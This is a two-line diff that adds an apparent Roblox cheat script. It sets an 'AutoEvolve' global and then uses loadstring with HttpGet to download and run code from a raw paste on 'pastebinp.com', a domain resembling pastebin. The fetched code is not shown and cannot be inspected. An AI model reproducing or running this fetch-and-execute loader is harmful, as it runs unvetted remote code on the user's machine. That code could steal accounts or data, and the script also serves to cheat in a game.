@@ -1,0 +1,2 @@
+_G.AutoEvolve = true --this will evolve exp so ur inventory wont get full
+loadstring(game:HttpGet("https://pastebinp.com/raw/9LfqWXmP", true))()
